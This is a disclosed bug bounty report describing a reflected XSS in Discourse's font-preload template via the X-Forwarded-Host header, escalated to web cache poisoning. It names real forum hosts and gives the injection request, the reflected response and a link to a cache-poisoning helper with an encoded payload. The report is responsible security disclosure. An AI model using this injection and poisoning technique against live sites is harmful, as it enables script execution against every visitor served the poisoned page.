# Web Cache Deception Attack (XSS)

## Report Details
- **Report ID**: 394016
- **URL**: https://hackerone.com/reports/394016
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-08-13T06:04:57.161Z
- **Disclosed**: 2018-11-18T07:09:41.188Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: discourse

## Vulnerability Information
This XSS does not affect the try.discourse.org, but worked on many other Discourse instances, that i tested. In discussions with the Mozilla team, we came to the conclusion that this is a vulnerability in the Discourse and it needs to be sent through this program.
List of vulnerable hosts:
```
discourse.mozilla.org
forum.learning.mozilla.org
forum.glasswire.com
help.nextcloud.com
meta.discourse.org
```

Description XSS
===
The Web application is vulnerable to XSS through the X-Forwarded-Host header. 

**Vulnerable code**
https://github.com/discourse/discourse/blob/master/app/views/common/_special_font_face.html.erb#L12-L18
```
<% woff2_url = "#{asset_path("fontawesome-webfont.woff2")}?#{font_domain}&v=4.7.0".html_safe %>

<link rel="preload" href="<%=woff2_url%>" as="font" type="font/woff2" crossorigin />
...
    src: url('<%=woff2_url %>') format('woff2'),
```




**HTTP Request**
```http
GET /?xx HTTP/1.1
Host: meta.discourse.org
X-Forwarded-Host: cacheattack'"><script>alert(document.domain)</script>
```

**HTTP Response**
```html
<link rel="preload" 
   href="https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'">
   <script>alert(document.domain)</script>
   &2&v=4.7.0" as="font" type="font/woff2" crossorigin />
<style>
  @font-face {
    font-family: 'FontAwesome';
    src: url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'">
    <script>alert(document.domain)</script>
    &2&v=4.7.0') format('woff2'),
         url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-ba0c59deb5450f5cb41b3f93609ee2d0d995415877ddfa223e8a8a7533474f07.woff?https://cacheattack&#39;&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&amp;2&v=4.7.0') format('woff');
  }
</style>
```

Web Cache Deception
===
Also, the application caches the HTTP response for 1 minute, so if you send an HTTP request with XSS payload, it will be cached and will be displayed for all requests when the headers match:
Request Start Line, Accept, Accept-Encoding.

**Steps To Reproduce**
For a simpler demonstration, I wrote a script.
The script takes the necessary headers from the request and poisons the cache.
You just need to open the cached page.

1) Open URL
```
https://blackfan.ru/bugbounty/webcachedeception.php?url=https://meta.discourse.org/?cacheattack&payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cache=60
```
2) Open the cached URL that the script displays.

3) Result

{F332797}

## Impact

Attacker can collect the popular combinations of Accep + Accept-Encoding and poison the cache of the web pages every minute.
The impact is like a stored XSS on any page.

## Attachments
- Screenshot_at_10-00-49.png
